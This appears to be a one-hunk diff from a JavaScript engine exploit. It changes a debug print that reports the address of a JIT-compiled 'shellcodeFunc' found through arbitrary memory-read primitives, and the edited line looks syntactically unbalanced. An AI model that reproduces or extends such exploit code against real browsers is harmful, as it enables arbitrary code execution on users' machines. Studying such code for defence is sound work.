@@ -893,7 +893,7 @@ var shellcodeFunc = makeJITCompiledFunction();
     //
 
     var executableAddr = primitives.read64(Add(shellcodeFuncAddr, 24));
-    print("[+] Executable instance @ " + executableAddr + primitives.read(Add(shellcodeFuncAddr, 24),8));
+    print("[+] Executable instance @ " + executableAddr + primitives.read64(Add(shellcodeFuncAddr, 24));
 
     //
     // 'executableAddr' now points to an ExecutableBase:
